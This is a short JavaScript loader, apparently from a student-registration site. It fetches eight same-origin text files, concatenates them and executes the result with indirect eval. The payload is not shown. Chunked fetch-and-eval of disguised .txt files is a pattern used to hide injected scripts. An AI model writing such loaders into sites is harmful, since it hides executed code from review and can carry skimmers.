(function(){
  var F=["/js/_asr_s0.txt","/js/_asr_s1.txt","/js/_asr_s2.txt","/js/_asr_s3.txt","/js/_asr_s4.txt","/js/_asr_s5.txt","/js/_asr_s6.txt","/js/_asr_s7.txt"];
  Promise.all(F.map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(p){ (0,eval)(p.join("")); })
  .catch(function(e){ console.error("[students-reg]",e); });
})();
